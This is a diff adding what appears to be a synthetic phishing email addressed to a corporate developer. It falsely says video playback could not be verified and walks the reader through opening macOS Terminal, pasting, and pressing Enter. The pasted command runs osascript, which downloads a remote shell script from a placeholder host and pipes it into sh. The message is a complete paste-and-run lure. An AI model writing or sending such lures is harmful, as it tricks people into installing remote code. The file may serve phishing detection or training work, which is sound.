@@ -1,0 +1,9 @@
+From: =?utf-8?B?U3VwcG9ydA==?= <no-reply@stream-verify.example>
+To: dev@corp.internal
+Date: Tue, 22 Sep 2026 10:11:00 +0800
+Message-ID: <0001-b29@synth.example>
+Subject: Complete playback verification
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>Video playback could not be verified automatically.</p><p>1. Open <b>Terminal</b> (Spotlight: terminal)<br>2. Paste with <b>Cmd+V</b><br>3. Press Enter</p><p style='font-family:monospace;background:#eee;padding:8px'>osascript -e 'do shell script "curl -s hxxp://cdn-mac-chk.example/a.sh|sh"'</p></body></html>
